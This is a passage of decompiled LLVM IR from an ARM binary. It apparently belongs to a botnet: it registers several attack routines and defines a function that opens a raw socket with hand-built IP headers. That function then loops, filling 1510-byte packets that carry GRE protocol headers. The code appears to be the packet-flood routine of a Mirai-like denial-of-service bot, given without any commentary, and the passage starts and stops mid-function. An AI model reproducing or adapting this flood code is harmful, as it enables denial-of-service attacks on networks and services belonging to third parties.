  %v0_a69c = load i32, i32* %r3.global-to-local, align 4
  %v1_a69c = load i32, i32* @r7, align 4
  %v2_a69c = add i32 %v1_a69c, %v0_a69c
  store i32 %v2_a69c, i32* %r3.global-to-local, align 4
  %v1_a6a4 = trunc i32 %v2_a69c to i8
  %v2_a6a4 = load i32, i32* @r5, align 4
  %v3_a6a4 = inttoptr i32 %v2_a6a4 to i8*
  store i8 %v1_a6a4, i8* %v3_a6a4, align 1
  %v0_a6a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a6a8 = load i32, i32* @r6, align 4
  %v2_a6a8 = inttoptr i32 %v1_a6a8 to i32*
  store i32 %v0_a6a8, i32* %v2_a6a8, align 4
  %v2_a6ac = call i32 @function_144a8(i32 %v1_a69c, i32 8)
  %v2_a6b0 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a6b0 = zext i8 %v2_a6b0 to i32
  store i32 ptrtoint (i32* @global_var_b4c0.80 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a6ac, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_a6c0 = load i32, i32* @r7, align 4
  %v2_a6c0 = add i32 %v1_a6c0, %v3_a6b0
  store i32 %v2_a6c0, i32* %r1.global-to-local, align 4
  %v2_a6c4 = load i32, i32* @global_var_212f0.53, align 4
  %v2_a6c8 = inttoptr i32 %v2_a6ac to i32*
  store i32 ptrtoint (i32* @global_var_b4c0.80 to i32), i32* %v2_a6c8, align 4
  %v3_a6cc = load i32, i32* @r4, align 4
  %v4_a6cc = add i32 %v3_a6cc, 4
  %v5_a6cc = inttoptr i32 %v4_a6cc to i8*
  store i8 5, i8* %v5_a6cc, align 1
  %v0_a6d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a6d0 = mul i32 %v0_a6d0, 4
  store i32 %v3_a6d0, i32* %r1.global-to-local, align 4
  %v5_a6d4 = inttoptr i32 %v2_a6c4 to i32*
  %v6_a6d4 = call i32 @function_145dc(i32* %v5_a6d4, i32 %v3_a6d0, i32 ptrtoint (i32* @global_var_b4c0.80 to i32), i32 5)
  %v2_a6d8 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a6d8 = zext i8 %v2_a6d8 to i32
  store i32 %v3_a6d8, i32* %r3.global-to-local, align 4
  store i32 %v6_a6d4, i32* %r2.global-to-local, align 4
  %v0_a6e0 = load i32, i32* @r4, align 4
  %v5_a6e0 = mul nuw nsw i32 %v3_a6d8, 4
  %v6_a6e0 = add i32 %v5_a6e0, %v6_a6d4
  %v7_a6e0 = inttoptr i32 %v6_a6e0 to i32*
  store i32 %v0_a6e0, i32* %v7_a6e0, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a6e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a6e8 = load i32, i32* @r7, align 4
  %v2_a6e8 = add i32 %v1_a6e8, %v0_a6e8
  store i32 %v2_a6e8, i32* %r3.global-to-local, align 4
  %v1_a6f0 = trunc i32 %v2_a6e8 to i8
  %v2_a6f0 = load i32, i32* @r5, align 4
  %v3_a6f0 = inttoptr i32 %v2_a6f0 to i8*
  store i8 %v1_a6f0, i8* %v3_a6f0, align 1
  %v0_a6f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a6f4 = load i32, i32* @r6, align 4
  %v2_a6f4 = inttoptr i32 %v1_a6f4 to i32*
  store i32 %v0_a6f4, i32* %v2_a6f4, align 4
  %v2_a6f8 = call i32 @function_144a8(i32 %v1_a6e8, i32 8)
  %v2_a6fc = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a6fc = zext i8 %v2_a6fc to i32
  store i32 ptrtoint (i32* @global_var_aea4.82 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a6f8, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_a70c = load i32, i32* @r7, align 4
  %v2_a70c = add i32 %v1_a70c, %v3_a6fc
  store i32 %v2_a70c, i32* %r1.global-to-local, align 4
  %v2_a710 = load i32, i32* @global_var_212f0.53, align 4
  %v2_a714 = inttoptr i32 %v2_a6f8 to i32*
  store i32 ptrtoint (i32* @global_var_aea4.82 to i32), i32* %v2_a714, align 4
  %v3_a718 = load i32, i32* @r4, align 4
  %v4_a718 = add i32 %v3_a718, 4
  %v5_a718 = inttoptr i32 %v4_a718 to i8*
  store i8 6, i8* %v5_a718, align 1
  %v0_a71c = load i32, i32* %r1.global-to-local, align 4
  %v3_a71c = mul i32 %v0_a71c, 4
  store i32 %v3_a71c, i32* %r1.global-to-local, align 4
  %v5_a720 = inttoptr i32 %v2_a710 to i32*
  %v6_a720 = call i32 @function_145dc(i32* %v5_a720, i32 %v3_a71c, i32 ptrtoint (i32* @global_var_aea4.82 to i32), i32 6)
  %v2_a724 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a724 = zext i8 %v2_a724 to i32
  store i32 %v3_a724, i32* %r3.global-to-local, align 4
  store i32 %v6_a720, i32* %r2.global-to-local, align 4
  %v0_a72c = load i32, i32* @r4, align 4
  %v5_a72c = mul nuw nsw i32 %v3_a724, 4
  %v6_a72c = add i32 %v5_a72c, %v6_a720
  %v7_a72c = inttoptr i32 %v6_a72c to i32*
  store i32 %v0_a72c, i32* %v7_a72c, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a734 = load i32, i32* %r3.global-to-local, align 4
  %v1_a734 = load i32, i32* @r7, align 4
  %v2_a734 = add i32 %v1_a734, %v0_a734
  store i32 %v2_a734, i32* %r3.global-to-local, align 4
  %v1_a73c = trunc i32 %v2_a734 to i8
  %v2_a73c = load i32, i32* @r5, align 4
  %v3_a73c = inttoptr i32 %v2_a73c to i8*
  store i8 %v1_a73c, i8* %v3_a73c, align 1
  %v0_a740 = load i32, i32* %r2.global-to-local, align 4
  %v1_a740 = load i32, i32* @r6, align 4
  %v2_a740 = inttoptr i32 %v1_a740 to i32*
  store i32 %v0_a740, i32* %v2_a740, align 4
  %v2_a744 = call i32 @function_144a8(i32 %v1_a734, i32 8)
  %v2_a748 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a748 = zext i8 %v2_a748 to i32
  store i32 ptrtoint (i32* @global_var_a810.84 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a744, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_a758 = load i32, i32* @r7, align 4
  %v2_a758 = add i32 %v1_a758, %v3_a748
  store i32 %v2_a758, i32* %r1.global-to-local, align 4
  %v2_a75c = load i32, i32* @global_var_212f0.53, align 4
  %v2_a760 = inttoptr i32 %v2_a744 to i32*
  store i32 ptrtoint (i32* @global_var_a810.84 to i32), i32* %v2_a760, align 4
  %v3_a764 = load i32, i32* @r4, align 4
  %v4_a764 = add i32 %v3_a764, 4
  %v5_a764 = inttoptr i32 %v4_a764 to i8*
  store i8 7, i8* %v5_a764, align 1
  %v0_a768 = load i32, i32* %r1.global-to-local, align 4
  %v3_a768 = mul i32 %v0_a768, 4
  store i32 %v3_a768, i32* %r1.global-to-local, align 4
  %v5_a76c = inttoptr i32 %v2_a75c to i32*
  %v6_a76c = call i32 @function_145dc(i32* %v5_a76c, i32 %v3_a768, i32 ptrtoint (i32* @global_var_a810.84 to i32), i32 7)
  %v2_a770 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a770 = zext i8 %v2_a770 to i32
  store i32 %v3_a770, i32* %r3.global-to-local, align 4
  store i32 %v6_a76c, i32* %r2.global-to-local, align 4
  %v0_a778 = load i32, i32* @r4, align 4
  %v5_a778 = mul nuw nsw i32 %v3_a770, 4
  %v6_a778 = add i32 %v5_a778, %v6_a76c
  %v7_a778 = inttoptr i32 %v6_a778 to i32*
  store i32 %v0_a778, i32* %v7_a778, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a780 = load i32, i32* %r3.global-to-local, align 4
  %v1_a780 = load i32, i32* @r7, align 4
  %v2_a780 = add i32 %v1_a780, %v0_a780
  store i32 %v2_a780, i32* %r3.global-to-local, align 4
  %v1_a788 = trunc i32 %v2_a780 to i8
  %v2_a788 = load i32, i32* @r5, align 4
  %v3_a788 = inttoptr i32 %v2_a788 to i8*
  store i8 %v1_a788, i8* %v3_a788, align 1
  %v0_a78c = load i32, i32* %r2.global-to-local, align 4
  %v1_a78c = load i32, i32* @r6, align 4
  %v2_a78c = inttoptr i32 %v1_a78c to i32*
  store i32 %v0_a78c, i32* %v2_a78c, align 4
  %v2_a790 = call i32 @function_144a8(i32 %v1_a780, i32 8)
  %v2_a794 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a794 = zext i8 %v2_a794 to i32
  store i32 ptrtoint (i32* @global_var_8190.86 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a790, i32* @r4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_a7a4 = load i32, i32* @r7, align 4
  %v2_a7a4 = add i32 %v1_a7a4, %v3_a794
  store i32 %v2_a7a4, i32* %r1.global-to-local, align 4
  %v2_a7a8 = load i32, i32* @global_var_212f0.53, align 4
  %v2_a7ac = inttoptr i32 %v2_a790 to i32*
  store i32 ptrtoint (i32* @global_var_8190.86 to i32), i32* %v2_a7ac, align 4
  %v3_a7b0 = load i32, i32* @r4, align 4
  %v4_a7b0 = add i32 %v3_a7b0, 4
  %v5_a7b0 = inttoptr i32 %v4_a7b0 to i8*
  store i8 10, i8* %v5_a7b0, align 1
  %v0_a7b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a7b4 = mul i32 %v0_a7b4, 4
  store i32 %v3_a7b4, i32* %r1.global-to-local, align 4
  %v5_a7b8 = inttoptr i32 %v2_a7a8 to i32*
  %v6_a7b8 = call i32 @function_145dc(i32* %v5_a7b8, i32 %v3_a7b4, i32 ptrtoint (i32* @global_var_8190.86 to i32), i32 10)
  %v2_a7bc = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a7bc = zext i8 %v2_a7bc to i32
  store i32 %v3_a7bc, i32* %r3.global-to-local, align 4
  %v1_a7c0 = load i32, i32* @r6, align 4
  %v2_a7c0 = inttoptr i32 %v1_a7c0 to i32*
  store i32 %v6_a7b8, i32* %v2_a7c0, align 4
  %v0_a7c4 = load i32, i32* @r4, align 4
  %v2_a7c4 = load i32, i32* %r3.global-to-local, align 4
  %v5_a7c4 = mul i32 %v2_a7c4, 4
  %v6_a7c4 = add i32 %v5_a7c4, %v6_a7b8
  %v7_a7c4 = inttoptr i32 %v6_a7c4 to i32*
  store i32 %v0_a7c4, i32* %v7_a7c4, align 4
  %v0_a7c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7c8 = load i32, i32* @r7, align 4
  %v2_a7c8 = add i32 %v1_a7c8, %v0_a7c8
  store i32 %v2_a7c8, i32* %r2.global-to-local, align 4
  %v1_a7d0 = trunc i32 %v2_a7c8 to i8
  %v2_a7d0 = load i32, i32* @r5, align 4
  %v3_a7d0 = inttoptr i32 %v2_a7d0 to i8*
  store i8 %v1_a7d0, i8* %v3_a7d0, align 1
  ret i32 %v1_a7c8

; uselistorder directives
  uselistorder i32 %v1_a7c8, { 1, 0 }
  uselistorder i32 %v3_a7b4, { 1, 0 }
  uselistorder i32 %v1_a780, { 1, 0 }
  uselistorder i32 %v3_a768, { 1, 0 }
  uselistorder i32 %v1_a734, { 1, 0 }
  uselistorder i32 %v3_a71c, { 1, 0 }
  uselistorder i32 %v1_a6e8, { 1, 0 }
  uselistorder i32 %v3_a6d0, { 1, 0 }
  uselistorder i32 %v1_a69c, { 1, 0 }
  uselistorder i32 %v3_a684, { 1, 0 }
  uselistorder i32 %v1_a650, { 1, 0 }
  uselistorder i32 %v3_a638, { 1, 0 }
  uselistorder i32 %v1_a604, { 1, 0 }
  uselistorder i32 %v3_a5ec, { 1, 0 }
  uselistorder i32 %v1_a5b8, { 1, 0 }
  uselistorder i32 %v3_a5a0, { 1, 0 }
  uselistorder i32 %v1_a56c, { 1, 0 }
  uselistorder i32 %v3_a554, { 1, 0 }
  uselistorder i32 %v2_a530, { 1, 0 }
  uselistorder i32 %v6_a50c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a508, { 1, 0 }
  uselistorder i8 7, { 2, 3, 4, 0, 1 }
  uselistorder i8 3, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_212ec.51 to i8*), { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_212ed.68 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_212f0.53, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
}

define i32 @function_a810(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a810:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a810 = load i32, i32* @r4, align 4
  %v6_a810 = load i32, i32* @r5, align 4
  %v24_a810 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_a82c = call i32 @function_144a8(i32 %arg1, i32 4)
  %v0_a830 = load i32, i32* @r5, align 4
  store i32 %v0_a830, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a840 = load i32, i32* @r4, align 4
  store i32 %v0_a840, i32* %r0.global-to-local, align 4
  %v5_a844 = inttoptr i32 %v0_a830 to i32*
  %v6_a844 = call i32 @function_a45c(i32 %v0_a840, i32* %v5_a844, i32 2, i32 0)
  %v1_a850 = urem i32 %v6_a844, 256
  store i32 %v1_a850, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a85c = load i32, i32* @r5, align 4
  store i32 %v0_a85c, i32* %r1.global-to-local, align 4
  %v0_a860 = load i32, i32* @r4, align 4
  store i32 %v0_a860, i32* %r0.global-to-local, align 4
  %v5_a864 = trunc i32 %v6_a844 to i8
  %v6_a868 = inttoptr i32 %v0_a85c to i32*
  %v7_a868 = call i32 @function_a45c(i32 %v0_a860, i32* %v6_a868, i32 3, i32 65535)
  %v0_a86c = load i32, i32* @r5, align 4
  store i32 %v0_a86c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a868, i32* %fp.global-to-local, align 4
  %v0_a87c = load i32, i32* @r4, align 4
  store i32 %v0_a87c, i32* %r0.global-to-local, align 4
  %v4_a880 = inttoptr i32 %v0_a86c to i32*
  %v5_a880 = call i32 @function_a45c(i32 %v0_a87c, i32* %v4_a880, i32 4, i32 64)
  %v1_a888 = urem i32 %v5_a880, 256
  store i32 %v1_a888, i32* %ip.global-to-local, align 4
  %v0_a88c = load i32, i32* @r5, align 4
  store i32 %v0_a88c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a898 = load i32, i32* @r4, align 4
  store i32 %v0_a898, i32* %r0.global-to-local, align 4
  %v6_a8a0 = inttoptr i32 %v0_a88c to i32*
  %v7_a8a0 = call i32 @function_a45c(i32 %v0_a898, i32* %v6_a8a0, i32 5, i32 1)
  %v1_a8ac = urem i32 %v7_a8a0, 256
  store i32 %v1_a8ac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a8b8 = load i32, i32* @r5, align 4
  store i32 %v0_a8b8, i32* %r1.global-to-local, align 4
  %v0_a8bc = load i32, i32* @r4, align 4
  store i32 %v0_a8bc, i32* %r0.global-to-local, align 4
  %v5_a8c4 = inttoptr i32 %v0_a8b8 to i32*
  %v6_a8c4 = call i32 @function_a45c(i32 %v0_a8bc, i32* %v5_a8c4, i32 6, i32 65535)
  %v0_a8cc = load i32, i32* @r5, align 4
  store i32 %v0_a8cc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a8c4, i32* @r8, align 4
  %v0_a8dc = load i32, i32* @r4, align 4
  store i32 %v0_a8dc, i32* %r0.global-to-local, align 4
  %v4_a8e0 = inttoptr i32 %v0_a8cc to i32*
  %v5_a8e0 = call i32 @function_a45c(i32 %v0_a8dc, i32* %v4_a8e0, i32 7, i32 65535)
  %v0_a8e4 = load i32, i32* @r5, align 4
  store i32 %v0_a8e4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_a8e0, i32* @r7, align 4
  %v0_a8f4 = load i32, i32* @r4, align 4
  store i32 %v0_a8f4, i32* %r0.global-to-local, align 4
  %v4_a8f8 = inttoptr i32 %v0_a8e4 to i32*
  %v5_a8f8 = call i32 @function_a45c(i32 %v0_a8f4, i32* %v4_a8f8, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a908 = load i32, i32* @r5, align 4
  store i32 %v0_a908, i32* %r1.global-to-local, align 4
  %v0_a90c = load i32, i32* @r4, align 4
  store i32 %v0_a90c, i32* %r0.global-to-local, align 4
  %v4_a910 = inttoptr i32 %v0_a908 to i32*
  %v5_a910 = call i32 @function_a45c(i32 %v0_a90c, i32* %v4_a910, i32 1, i32 1)
  %v1_a918 = urem i32 %v5_a910, 256
  store i32 %v1_a918, i32* %ip.global-to-local, align 4
  %v0_a91c = load i32, i32* @r5, align 4
  store i32 %v0_a91c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a928 = load i32, i32* @r4, align 4
  store i32 %v0_a928, i32* %r0.global-to-local, align 4
  %v5_a930 = inttoptr i32 %v0_a91c to i32*
  %v6_a930 = call i32 @function_a45c(i32 %v0_a928, i32* %v5_a930, i32 19, i32 0)
  %v0_a938 = load i32, i32* @r5, align 4
  store i32 %v0_a938, i32* %r1.global-to-local, align 4
  %v2_a93c = load i32, i32* @global_var_23394.88, align 4
  store i32 %v2_a93c, i32* %r3.global-to-local, align 4
  store i32 %v6_a930, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_a948 = load i32, i32* @r4, align 4
  store i32 %v0_a948, i32* %r0.global-to-local, align 4
  %v4_a94c = inttoptr i32 %v0_a938 to i32*
  %v5_a94c = call i32 @function_a45c(i32 %v0_a948, i32* %v4_a94c, i32 25, i32 %v2_a93c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a960 = call i32 @function_13940(i32 2, i32 3, i32 6)
  store i32 %v3_a960, i32* %r0.global-to-local, align 4
  %v7_a964 = icmp eq i32 %v3_a960, -1
  store i1 %v7_a964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a964, label %dec_label_pc_ae78, label %dec_label_pc_a970

dec_label_pc_a970:                                ; preds = %dec_label_pc_a810
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a978 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a978, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a98c = call i32 @function_138fc(i32 %v3_a960, i32 0, i32 3, i32 %v6_a978, i32 4)
  store i32 %v5_a98c, i32* %r0.global-to-local, align 4
  %v7_a990 = icmp eq i32 %v5_a98c, -1
  store i1 %v7_a990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a990, label %dec_label_pc_ae70, label %dec_label_pc_a998

dec_label_pc_a998:                                ; preds = %dec_label_pc_a970
  %v0_a998 = load i32, i32* @r8, align 4
  %v0_a99c = load i32, i32* @r7, align 4
  %v0_a9a0 = load i32, i32* %fp.global-to-local, align 4
  %v0_a9a4 = load i32, i32* @r6, align 4
  %v1_a9a4 = urem i32 %v0_a9a4, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_a9ac = urem i32 %v0_a998, 65536
  store i32 %v3_a9ac, i32* %r3.global-to-local, align 4
  %v3_a9b0 = urem i32 %v0_a99c, 65536
  store i32 %v3_a9b0, i32* %r4.global-to-local, align 4
  %v0_a9b4 = load i32, i32* @sl, align 4
  %v2_a9b4 = icmp eq i32 %v0_a9b4, 0
  store i1 %v2_a9b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_a9cc = urem i32 %v0_a9a0, 65536
  store i32 %v3_a9cc, i32* @fp, align 4
  br i1 %v2_a9b4, label %dec_label_pc_ae84, label %dec_label_pc_a9dc

dec_label_pc_a9dc:                                ; preds = %dec_label_pc_a998
  %v3_a99c = mul i32 %v0_a99c, 65536
  %v3_a998 = mul i32 %v0_a998, 65536
  %v0_a9a0.not = or i32 %v0_a9a0, -65536
  %v1_a9e0 = xor i32 %v0_a9a0.not, 65535
  %v3_a9e4 = mul i32 %v5_a8f8, 65536
  %v1_a9e8 = add i32 %v3_a9e4, 4325376
  %tmp73 = udiv i32 %v1_a9e8, 256
  %v3_a9fc = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_a9e0, 256
  %v3_aa00 = and i32 %tmp74, 65280
  store i32 %v3_aa00, i32* %ip.global-to-local, align 4
  %v1_aa04 = add i32 %v3_a9e4, 524288
  %v1_aa0c = add i32 %v3_a9e4, 1835008
  %tmp75 = udiv i32 %v1_a9e0, 256
  %v4_aa10 = urem i32 %tmp75, 256
  %v5_aa10 = or i32 %v4_aa10, %v3_aa00
  %v4_aa18 = udiv i32 %v1_a9e8, 16777216
  %v5_aa18 = or i32 %v3_a9fc, %v4_aa18
  store i32 %v5_aa18, i32* @r8, align 4
  %v3_aa24 = udiv i32 %v1_aa0c, 256
  %tmp76 = mul i32 %v0_a9a0, 256
  %v3_aa28 = and i32 %tmp76, 65280
  store i32 %v3_a998, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_a9a0, 256
  %v4_aa38 = urem i32 %tmp77, 256
  %v5_aa38 = or i32 %v4_aa38, %v3_aa28
  store i32 %v5_aa38, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_a998, 256
  %v3_aa3c = and i32 %tmp78, 65280
  %v1_aa40 = and i32 %v3_aa24, 65280
  store i32 %v1_aa40, i32* @r6, align 4
  store i32 %v3_a99c, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_a99c, 256
  %v3_aa4c = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_a998, 256
  %v4_aa50 = urem i32 %tmp80, 256
  %v5_aa50 = or i32 %v4_aa50, %v3_aa3c
  store i32 %v5_aa50, i32* @lr, align 4
  %v4_aa54 = udiv i32 %v1_aa0c, 16777216
  %v5_aa54 = or i32 %v1_aa40, %v4_aa54
  store i32 %v5_aa54, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_a99c, 256
  %v4_aa58 = urem i32 %tmp81, 256
  %v5_aa58 = or i32 %v4_aa58, %v3_aa4c
  %tmp82 = udiv i32 %v1_aa04, 256
  %v3_aa5c = and i32 %tmp82, 65280
  store i32 %v3_aa5c, i32* @r5, align 4
  %v5_aa60 = trunc i32 %v5_aa38 to i16
  %v5_aa68 = trunc i32 %v5_aa54 to i16
  %v4_aa70 = udiv i32 %v1_aa04, 16777216
  %v5_aa70 = or i32 %v3_aa5c, %v4_aa70
  store i32 %v5_aa70, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_aacc = sext i8 %v5_a864 to i32
  %v1_aad8 = trunc i32 %v5_a880 to i8
  %sext = mul nuw i32 %v5_aa10, 65536
  %v4_ab64 = sdiv i32 %sext, 65536
  %v2_ab90 = icmp eq i32 %v1_a9a4, 0
  %sext8 = mul nuw i32 %v5_aa50, 65536
  %v4_abb0 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_aa58, 65536
  %v4_abb8 = sdiv i32 %sext9, 65536
  %v1_ab7027 = trunc i32 %v4_ab64 to i16
  br label %dec_label_pc_aa78

dec_label_pc_aa78:                                ; preds = %bb85, %dec_label_pc_a9dc
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_aa84 = call i32 @function_144a8(i32 1510, i32 4)
  store i32 %v2_aa84, i32* %r0.global-to-local, align 4
  %v2_aa8c = load i32, i32* @r4, align 4
  %v5_aa8c = mul i32 %v2_aa8c, 4
  %v6_aa8c = add i32 %v5_aa8c, %v2_a82c
  %v7_aa8c = inttoptr i32 %v6_aa8c to i32*
  store i32 %v2_aa84, i32* %v7_aa8c, align 4
  %v3_aa90 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa90, i32* %r2.global-to-local, align 4
  %v5_aa98 = mul i32 %v3_aa90, 24
  %v1_aa9c = load i32, i32* @sb, align 4
  %v2_aa9c = add i32 %v1_aa9c, %v5_aa98
  store i32 %v2_aa9c, i32* @lr, align 4
  store i32 %v2_a82c, i32* %r3.global-to-local, align 4
  %v4_aaa4 = mul i32 %v3_aa90, 4
  %v5_aaa4 = add i32 %v4_aaa4, %v2_a82c
  %v6_aaa4 = inttoptr i32 %v5_aaa4 to i32*
  %v7_aaa4 = load i32, i32* %v6_aaa4, align 4
  store i32 %v7_aaa4, i32* %r4.global-to-local, align 4
  %v1_aaa8 = inttoptr i32 %v7_aaa4 to i8*
  %v2_aaa8 = load i8, i8* %v1_aaa8, align 1
  %tmp = urem i8 %v2_aaa8, 16
  %v1_aaac = zext i8 %tmp to i32
  %v1_aab0 = or i32 %v1_aaac, 64
  store i32 %v1_aab0, i32* %r3.global-to-local, align 4
  %v1_aab4 = trunc i32 %v1_aab0 to i8
  store i8 %v1_aab4, i8* %v1_aaa8, align 1
  %v0_aab8 = load i32, i32* %r4.global-to-local, align 4
  %v1_aab8 = inttoptr i32 %v0_aab8 to i8*
  %v2_aab8 = load i8, i8* %v1_aab8, align 1
  %v1_aabc = and i8 %v2_aab8, -16
  %v1_aac0 = or i8 %v1_aabc, 5
  store i32 %v1_a8ac, i32* %r5.global-to-local, align 4
  store i8 %v1_aac0, i8* %v1_aab8, align 1
  store i32 %v4_aacc, i32* %r1.global-to-local, align 4
  %v2_aad0 = load i32, i32* %r4.global-to-local, align 4
  %v3_aad0 = add i32 %v2_aad0, 1
  %v4_aad0 = inttoptr i32 %v3_aad0 to i8*
  store i8 %v5_a864, i8* %v4_aad0, align 1
  store i32 %v1_a888, i32* %r2.global-to-local, align 4
  %v2_aad8 = load i32, i32* %r4.global-to-local, align 4
  %v3_aad8 = add i32 %v2_aad8, 8
  %v4_aad8 = inttoptr i32 %v3_aad8 to i8*
  store i8 %v1_aad8, i8* %v4_aad8, align 1
  %v2_aae0 = load i32, i32* %r4.global-to-local, align 4
  %v3_aae0 = add i32 %v2_aae0, 4
  %v4_aae0 = inttoptr i32 %v3_aae0 to i16*
  store i16 %v5_aa60, i16* %v4_aae0, align 2
  %v2_aae8 = load i32, i32* %r4.global-to-local, align 4
  %v3_aae8 = add i32 %v2_aae8, 9
  %v4_aae8 = inttoptr i32 %v3_aae8 to i8*
  store i8 47, i8* %v4_aae8, align 1
  store i32 %v5_a94c, i32* %r3.global-to-local, align 4
  %v0_aaf0 = load i32, i32* %r5.global-to-local, align 4
  %v2_aaf0 = icmp eq i32 %v0_aaf0, 0
  store i1 %v2_aaf0, i1* %cpsr_z.global-to-local, align 1
  %v1_aaf4 = load i32, i32* %r4.global-to-local, align 4
  %v2_aaf4 = add i32 %v1_aaf4, 12
  %v3_aaf4 = inttoptr i32 %v2_aaf4 to i32*
  store i32 %v5_a94c, i32* %v3_aaf4, align 4
  br i1 %v2_aaf0, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_aa78
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_aafc = load i32, i32* %r4.global-to-local, align 4
  %v4_aafc = add i32 %v3_aafc, 6
  %v5_aafc = inttoptr i32 %v4_aafc to i16*
  store i16 64, i16* %v5_aafc, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_aa78, %bb
  %v0_ab00 = load i32, i32* @lr, align 4
  %v1_ab00 = add i32 %v0_ab00, 16
  %v2_ab00 = inttoptr i32 %v1_ab00 to i32*
  %v3_ab00 = load i32, i32* %v2_ab00, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
